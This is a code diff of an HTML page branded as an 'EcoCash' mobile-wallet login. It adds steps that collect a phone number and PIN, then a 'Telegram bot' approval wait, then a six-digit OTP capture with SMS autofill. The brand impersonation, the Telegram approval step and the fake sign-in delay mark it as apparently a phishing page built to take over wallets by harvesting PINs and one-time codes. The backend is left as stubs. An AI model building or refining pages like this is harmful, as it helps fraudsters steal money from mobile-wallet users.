@@ -6,56 +6,345 @@
 <meta name="theme-color" content="#0875d1">
 <title>Wallet Login</title>
 <style>
-*{box-sizing:border-box}
-html,body{margin:0;width:100%;height:100%;font-family:Arial,sans-serif}
-body{background:#0875d1}
-.app{
-  display:flex;flex-direction:column;
-  height:100vh;height:100dvh;width:100%;
-  overflow:hidden;color:white;
-  background:linear-gradient(160deg,#087bd8,#0063c9)
+* {
+  box-sizing: border-box;
 }
-.top{
-  height:59%;flex-shrink:0;
-  background:#fff;color:#303b42;
-  border-radius:0 0 50% 10% / 0 0 9% 5%;
-  padding:clamp(28px,7vh,58px) 22px 25px;
-  text-align:center
+
+[hidden] {
+  display: none !important;
 }
-.logo{font-size:clamp(29px,8vw,36px);font-weight:800;
-  letter-spacing:-1px;margin:0 0 clamp(26px,6vh,43px);
-  color:#1769b4}
-.logo span{color:#d23d43}
-h1{font-size:18px;margin:0 0 20px}
-.phone{height:46px;border:1.5px solid #2878b7;border-radius:6px;
-  display:flex;align-items:center;gap:9px;padding:0 9px;text-align:left}
-.dial{font-size:13px;color:#68727b}
-.phone input{width:100%;min-width:0;border:0;outline:0;
-  font-size:14px;background:transparent}
-.hint{font-size:12px;color:#626c74;margin:10px 0 21px}
-.pin{display:flex;justify-content:center;gap:7px}
-.pin input{width:clamp(42px,10vw,49px);height:clamp(42px,10vw,49px);
-  border:1.4px solid #2878b7;border-radius:7px;text-align:center;
-  font-size:22px;color:#1769b4;background:white}
-.bottom{flex:1;min-height:0;display:flex;flex-direction:column;
-  justify-content:flex-end;padding:12px 22px max(22px,env(safe-area-inset-bottom));
-  text-align:center}
-.prompt{font-size:12px;line-height:1.5;margin:0 auto 18px}
-.actions{display:flex;gap:10px}
-.actions button{height:56px;flex:1;border:0;border-radius:9px;
-  background:white;color:#0871c9;font-size:12px;cursor:pointer}
-.symbol{display:block;font-size:18px;margin-bottom:4px}
-.version{font-size:11px;margin:clamp(22px,5vh,42px) 0 8px}
-.terms{font-size:11px;line-height:1.4;margin:0;color:#eaf4ff}
-.terms a{color:white;text-decoration:underline}
-#notice{font-size:12px;min-height:16px;margin:8px 0 0}
-@media(max-height:650px){
- .top{height:62%;padding-top:20px}
- .logo{margin-bottom:16px}
- h1{margin-bottom:12px}
- .hint{margin:7px 0 12px}
- .version{margin-top:14px}
- .prompt{margin-bottom:10px}
+
+html,
+body {
+  margin: 0;
+  width: 100%;
+  height: 100%;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  background: #0875d1;
+}
+
+.app {
+  display: flex;
+  flex-direction: column;
+  height: 100vh;
+  height: 100dvh;
+  width: 100%;
+  overflow: hidden;
+  color: white;
+  background: linear-gradient(160deg, #087bd8, #0063c9);
+}
+
+.top {
+  height: 59%;
+  flex-shrink: 0;
+  background: #fff;
+  color: #303b42;
+  border-radius: 0 0 50% 10% / 0 0 9% 5%;
+  padding: clamp(28px, 7vh, 58px) 22px 25px;
+  text-align: center;
+}
+
+.logo {
+  font-size: clamp(29px, 8vw, 36px);
+  font-weight: 800;
+  letter-spacing: -1px;
+  margin: 0 0 clamp(26px, 6vh, 43px);
+  color: #1769b4;
+}
+
+.logo span {
+  color: #d23d43;
+}
+
+h1 {
+  font-size: 18px;
+  margin: 0 0 20px;
+}
+
+.step {
+  animation: rise 0.35s ease both;
+}
+
+@keyframes rise {
+  from {
+    opacity: 0;
+    transform: translateY(8px);
+  }
+  to {
+    opacity: 1;
+    transform: none;
+  }
+}
+
+.phone {
+  height: 46px;
+  border: 1.5px solid #2878b7;
+  border-radius: 6px;
+  display: flex;
+  align-items: center;
+  gap: 9px;
+  padding: 0 9px;
+  text-align: left;
+  transition: border-color 0.15s ease, box-shadow 0.15s ease;
+}
+
+.phone:focus-within {
+  border-color: #0875d1;
+  box-shadow: 0 0 0 3px rgba(8, 117, 209, 0.18);
+}
+
+.dial {
+  font-size: 13px;
+  color: #68727b;
+}
+
+.phone input {
+  width: 100%;
+  min-width: 0;
+  border: 0;
+  outline: 0;
+  font-size: 14px;
+  background: transparent;
+}
+
+.hint {
+  font-size: 12px;
+  color: #626c74;
+  margin: 10px 0 21px;
+}
+
+.pin {
+  display: flex;
+  justify-content: center;
+  gap: 7px;
+}
+
+.pin input {
+  width: clamp(42px, 10vw, 49px);
+  height: clamp(42px, 10vw, 49px);
+  border: 1.4px solid #2878b7;
+  border-radius: 7px;
+  text-align: center;
+  font-size: 22px;
+  color: #1769b4;
+  background: white;
+  transition: border-color 0.15s ease, box-shadow 0.15s ease;
+}
+
+.pin input:focus {
+  outline: none;
+  border-color: #0875d1;
+  box-shadow: 0 0 0 3px rgba(8, 117, 209, 0.18);
+}
+
+.subtle {
+  max-width: 300px;
+  margin: 0 auto;
+  font-size: 13px;
+  line-height: 1.5;
+  color: #626c74;
+}
+
+.subtle strong {
+  color: #1769b4;
+}
+
+.spinner {
+  width: 44px;
+  height: 44px;
+  margin: 8px auto 18px;
+  border: 4px solid #d6e6f5;
+  border-top-color: #0875d1;
+  border-radius: 50%;
+  animation: spin 0.9s linear infinite;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+.otp-row {
+  position: relative;
+  display: flex;
+  justify-content: center;
+  gap: 8px;
+  margin-top: 24px;
+}
+
+.otp-box {
+  width: clamp(38px, 10vw, 46px);
+  height: 52px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border: 1.5px solid #2878b7;
+  border-radius: 7px;
+  background: #fff;
+  color: #1769b4;
+  font-size: 22px;
+  font-weight: 600;
+  transition: border-color 0.15s ease, box-shadow 0.15s ease;
+}
+
+.otp-box.active {
+  border-color: #0875d1;
+  box-shadow: 0 0 0 3px rgba(8, 117, 209, 0.18);
+}
+
+.otp-input {
+  position: absolute;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+  opacity: 0;
+  font-size: 16px;
+  cursor: text;
+}
+
+.bottom {
+  flex: 1;
+  min-height: 0;
+  display: flex;
+  flex-direction: column;
+  justify-content: flex-end;
+  padding: 12px 22px max(22px, env(safe-area-inset-bottom));
+  text-align: center;
+}
+
+.prompt {
+  font-size: 12px;
+  line-height: 1.5;
+  margin: 0 auto 18px;
+}
+
+.btn-primary {
+  display: block;
+  width: 100%;
+  height: 52px;
+  margin: 0 0 12px;
+  border: 0;
+  border-radius: 9px;
+  background: #0a4f8f;
+  color: #fff;
+  font: 600 14px Arial, sans-serif;
+  cursor: pointer;
+  transition: background-color 0.2s ease, opacity 0.2s ease, transform 0.1s ease;
+}
+
+.btn-primary:hover:not(:disabled) {
+  background: #083f73;
+}
+
+.btn-primary:active:not(:disabled) {
+  transform: scale(0.98);
+}
+
+.btn-primary:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+
+.link {
+  padding: 8px;
+  border: 0;
+  background: none;
+  color: #fff;
+  font: inherit;
+  font-size: 13px;
+  text-decoration: underline;
+  cursor: pointer;
+}
+
+.actions {
+  display: flex;
+  gap: 10px;
+}
+
+.actions button {
+  height: 56px;
+  flex: 1;
+  border: 0;
+  border-radius: 9px;
+  background: white;
+  color: #0871c9;
+  font-size: 12px;
+  cursor: pointer;
+  transition: transform 0.1s ease, box-shadow 0.2s ease;
+}
+
+.actions button:hover {
+  box-shadow: 0 4px 14px rgba(0, 40, 90, 0.25);
+}
+
+.actions button:active {
+  transform: scale(0.98);
+}
+
+.symbol {
+  display: block;
+  font-size: 18px;
+  margin-bottom: 4px;
+}
+
+.version {
+  font-size: 11px;
+  margin: clamp(22px, 5vh, 42px) 0 8px;
+}
+
+.terms {
+  font-size: 11px;
+  line-height: 1.4;
+  margin: 0;
+  color: #eaf4ff;
+}
+
+.terms a {
+  color: white;
+  text-decoration: underline;
+}
+
+button:focus-visible,
+a:focus-visible {
+  outline: 2px solid #fff;
+  outline-offset: 2px;
+}
+
+#notice {
+  font-size: 12px;
+  min-height: 16px;
+  margin: 8px 0 0;
+}
+
+@media (max-height: 650px) {
+  .top {
+    height: 62%;
+    padding-top: 20px;
+  }
+
+  .logo {
+    margin-bottom: 16px;
+  }
+
+  h1 {
+    margin-bottom: 12px;
+  }
+
+  .hint {
+    margin: 7px 0 12px;
+  }
+
+  .version {
+    margin-top: 14px;
+  }
+
+  .prompt {
+    margin-bottom: 10px;
+  }
 }
 </style>
 </head>
@@ -63,81 +352,273 @@ h1{font-size:18px;margin:0 0 20px}
 <div class="app">
   <section class="top">
     <div class="logo">Eco<span>Cash</span></div>
-    <h1>Login</h1>
 
-    <div class="phone">
-      <span>🇿🇼</span>
-      <span class="dial">+263</span>
-      <input type="tel" inputmode="numeric"
-        placeholder="Phone Number" aria-label="Phone number">
+    <div class="step" data-step="login">
+      <h1>Login</h1>
+      <div class="phone">
+        <span>🇿🇼</span>
+        <span class="dial">+263</span>
+        <input id="phone" type="tel" inputmode="numeric" autocomplete="tel-national"
+          placeholder="Phone Number" aria-label="Phone number">
+      </div>
+
+      <p class="hint">Enter your PIN</p>
+      <div class="pin">
+        <input aria-label="PIN digit 1" type="password" inputmode="numeric" maxlength="1" autocomplete="off">
+        <input aria-label="PIN digit 2" type="password" inputmode="numeric" maxlength="1" autocomplete="off">
+        <input aria-label="PIN digit 3" type="password" inputmode="numeric" maxlength="1" autocomplete="off">
+        <input aria-label="PIN digit 4" type="password" inputmode="numeric" maxlength="1" autocomplete="off">
+      </div>
     </div>
 
-    <p class="hint">Enter your PIN</p>
-    <div class="pin">
-      <input aria-label="PIN digit 1" type="password"
-        inputmode="numeric" maxlength="1">
-      <input aria-label="PIN digit 2" type="password"
-        inputmode="numeric" maxlength="1">
-      <input aria-label="PIN digit 3" type="password"
-        inputmode="numeric" maxlength="1">
-      <input aria-label="PIN digit 4" type="password"
-        inputmode="numeric" maxlength="1">
+    <div class="step" data-step="signing" hidden>
+      <div class="spinner" aria-hidden="true"></div>
+      <h1>Signing you in...</h1>
+      <p class="subtle">Checking your phone number and PIN</p>
+    </div>
+
+    <div class="step" data-step="approval" hidden>
+      <div class="spinner" aria-hidden="true"></div>
+      <h1>Waiting for approval</h1>
+      <p class="subtle">
+        Approve this sign-in for <strong id="approval-phone"></strong> in the EcoCash Telegram bot.
+      </p>
+    </div>
+
+    <div class="step" data-step="otp" hidden>
+      <h1>Enter OTP</h1>
+      <p class="subtle">
+        Enter the 6-digit code sent to <strong id="otp-phone"></strong>
+      </p>
+      <div class="otp-row">
+        <div class="otp-box" aria-hidden="true"></div>
+        <div class="otp-box" aria-hidden="true"></div>
+        <div class="otp-box" aria-hidden="true"></div>
+        <div class="otp-box" aria-hidden="true"></div>
+        <div class="otp-box" aria-hidden="true"></div>
+        <div class="otp-box" aria-hidden="true"></div>
+        <input id="otp-input" class="otp-input" type="text" inputmode="numeric"
+          autocomplete="one-time-code" maxlength="6" aria-label="One-time code">
+      </div>
     </div>
   </section>
 
   <section class="bottom">
-    <p class="prompt">
-      To register for a wallet or get assistance, click below
-    </p>
-
-    <div class="actions">
-      <button type="button" id="register">
-        <span class="symbol">♟</span>Register
-      </button>
-      <button type="button" id="help">
-        <span class="symbol">ⓘ</span>Help &amp; Support
-      </button>
+    <div class="step" data-step="login">
+      <p class="prompt">To register for a wallet or get assistance, click below</p>
+      <button type="button" class="btn-primary" id="login-button">Log in</button>
+      <div class="actions">
+        <button type="button" id="register">
+          <span class="symbol">♟</span>Register
+        </button>
+        <button type="button" id="help">
+          <span class="symbol">ⓘ</span>Help &amp; Support
+        </button>
+      </div>
+      <p class="version">Eco Cash</p>
+      <p class="terms">
+        By continuing, you agree to the
+        <a href="#" id="terms">Terms and Conditions</a>
+      </p>
     </div>
 
-    <p class="version">Eco Cash</p>
-    <p class="terms">
-      By continuing, you agree to the
-      <a href="#" id="terms">Terms and Conditions</a>
-    </p>
+    <div class="step" data-step="signing" hidden>
+      <p class="prompt">This usually takes a few seconds.</p>
+    </div>
+
+    <div class="step" data-step="approval" hidden>
+      <p class="prompt">
+        Open the EcoCash approval bot on Telegram and tap Approve. This screen continues automatically once you approve.
+      </p>
+      <button type="button" class="btn-primary" id="approve-demo">Demo: mark as approved</button>
+      <button type="button" class="link" id="cancel-approval">Cancel</button>
+    </div>
+
+    <div class="step" data-step="otp" hidden>
+      <p class="prompt">Didn't get the code? You can request a new one shortly.</p>
+      <button type="button" class="btn-primary" id="resend" disabled>Resend code in 30s</button>
+      <button type="button" class="link" id="change-number">Change number</button>
+    </div>
+
     <p id="notice" role="status"></p>
   </section>
 </div>
 
 <script>
-const pinInputs = [...document.querySelectorAll(".pin input")];
+const $ = (selector) => document.querySelector(selector);
+
+const phoneInput = $('#phone');
+const pinInputs = [...document.querySelectorAll('.pin input')];
+const notice = $('#notice');
+const otpInput = $('#otp-input');
+const otpBoxes = [...document.querySelectorAll('.otp-box')];
+const resendButton = $('#resend');
+const RESEND_SECONDS = 30;
+
+let phoneNumber = '';
+let approvalResolve = null;
+let resendInterval = null;
+let otpAbort = null;
+
+function digitsOnly(value, maxLength) {
+  return value.replace(/\D/g, '').slice(0, maxLength);
+}
+
+function showStep(name) {
+  document.querySelectorAll('[data-step]').forEach((element) => {
+    element.hidden = element.dataset.step !== name;
+  });
+  notice.textContent = '';
+}
 
 pinInputs.forEach((input, index) => {
-  input.addEventListener("input", () => {
-    input.value = input.value.replace(/\D/g, "").slice(0, 1);
+  input.addEventListener('input', () => {
+    input.value = digitsOnly(input.value, 1);
     if (input.value && pinInputs[index + 1]) {
       pinInputs[index + 1].focus();
     }
   });
 
-  input.addEventListener("keydown", event => {
-    if (event.key === "Backspace" &&
-        !input.value && pinInputs[index - 1]) {
+  input.addEventListener('keydown', (event) => {
+    if (event.key === 'Backspace' && !input.value && pinInputs[index - 1]) {
       pinInputs[index - 1].focus();
     }
   });
 });
 
-const notice = document.getElementById("notice");
+function isLoginReady() {
+  return (
+    /^\d{9,15}$/.test(digitsOnly(phoneInput.value, 20)) &&
+    pinInputs.every((input) => input.value.length === 1)
+  );
+}
 
-document.getElementById("register").onclick = () => {
-  notice.textContent = "Install Ecocash supper app on playstore and register then comeback and continue with the process";
+$('#login-button').onclick = () => {
+  if (!isLoginReady()) {
+    notice.textContent = 'Enter your phone number and 4-digit PIN to continue.';
+    return;
+  }
+  phoneNumber = digitsOnly(phoneInput.value, 20);
+  showStep('signing');
+  window.setTimeout(showApproval, 1500);
 };
 
-document.getElementById("help").onclick = () => {
+function showApproval() {
+  $('#approval-phone').textContent = '+263 ' + phoneNumber;
+  showStep('approval');
+  waitForTelegramApproval().then(showOtp);
+}
+
+function waitForTelegramApproval() {
+  // Demo stand-in: resolves when the approve button is tapped. Replace with a check of the Telegram bot's approval status.
+  return new Promise((resolve) => {
+    approvalResolve = resolve;
+  });
+}
+
+$('#approve-demo').onclick = () => {
+  if (approvalResolve) {
+    approvalResolve();
+    approvalResolve = null;
+  }
+};
+
+$('#cancel-approval').onclick = () => {
+  approvalResolve = null;
+  showStep('login');
+};
+
+function showOtp() {
+  $('#otp-phone').textContent = '+263 ' + phoneNumber;
+  setOtpValue('');
+  showStep('otp');
+  otpInput.focus();
+  startResendCountdown();
+  listenForSmsCode();
+}
+
+function setOtpValue(value) {
+  otpInput.value = digitsOnly(value, 6);
+  renderOtpBoxes();
+  notice.textContent =
+    otpInput.value.length === 6 ? 'Code received. Connect your verification service to continue.' : '';
+}
+
+function renderOtpBoxes() {
+  const value = otpInput.value;
+  const activeIndex = Math.min(value.length, otpBoxes.length - 1);
+  otpBoxes.forEach((box, index) => {
+    box.textContent = value[index] ?? '';
+    box.classList.toggle('active', index === activeIndex);
+  });
+}
+
+otpInput.addEventListener('input', () => setOtpValue(otpInput.value));
+
+function listenForSmsCode() {
+  stopSmsListener();
+  if (!('OTPCredential' in window)) return;
+  otpAbort = new AbortController();
+  navigator.credentials
+    .get({ otp: { transport: ['sms'] }, signal: otpAbort.signal })
+    .then((credential) => {
+      if (credential && credential.code) setOtpValue(credential.code);
+    })
+    .catch(() => {
+      // SMS autofill is optional; typing the code still works.
+    });
+}
+
+function stopSmsListener() {
+  if (otpAbort) {
+    otpAbort.abort();
+    otpAbort = null;
+  }
+}
+
+function startResendCountdown() {
+  stopResendCountdown();
+  let remaining = RESEND_SECONDS;
+  resendButton.disabled = true;
+  resendButton.textContent = 'Resend code in ' + remaining + 's';
+  resendInterval = window.setInterval(() => {
+    remaining -= 1;
+    if (remaining > 0) {
+      resendButton.textContent = 'Resend code in ' + remaining + 's';
+      return;
+    }
+    stopResendCountdown();
+    resendButton.disabled = false;
+    resendButton.textContent = 'Resend code';
+  }, 1000);
+}
+
+function stopResendCountdown() {
+  window.clearInterval(resendInterval);
+  resendInterval = null;
+}
+
+resendButton.onclick = () => {
+  setOtpValue('');
+  startResendCountdown();
+  notice.textContent = 'Connect your SMS provider to send a new code.';
+};
+
+$('#change-number').onclick = () => {
+  stopResendCountdown();
+  stopSmsListener();
+  showStep('login');
+};
+
+$('#register').onclick = () => {
+  notice.textContent = 'Install the Ecocash super app on the Play Store and register, then come back and continue with the process.';
+};
+
+$('#help').onclick = () => {
   notice.textContent = "Use your provider's official support channel.";
 };
 
-document.getElementById("terms").onclick = event => {
+$('#terms').onclick = (event) => {
   event.preventDefault();
   notice.textContent = "Add your service's terms URL here.";
 };
